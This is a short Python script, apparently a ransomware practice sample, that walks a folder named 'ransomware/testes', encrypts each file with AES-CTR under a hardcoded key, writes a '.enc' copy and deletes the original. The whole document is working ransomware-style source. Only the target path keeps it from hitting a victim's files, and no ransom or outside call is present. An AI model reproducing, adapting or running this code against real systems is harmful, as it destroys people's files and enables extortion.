import os
import pyaes

KEY = b"0123456789123456"

def encrypt(file_path):
    with open(file_path, "rb") as file:
        content = file.read()

        aes = pyaes.AESModeOfOperationCTR(KEY)
        encrypted_data = aes.encrypt(content)

        new_file = f"{file_path}.enc"

    with open(new_file, "wb") as file:
        file.write(encrypted_data)
        os.remove(file_path)

system = os.walk("C:/Users/Kali/Desktop/ransomware/testes")
for root, dirs, files in system:
    for file in files:
        file_path = os.path.join(root, file)
        encrypt(file_path)
        print(f"[+] Encrypting {file_path}")
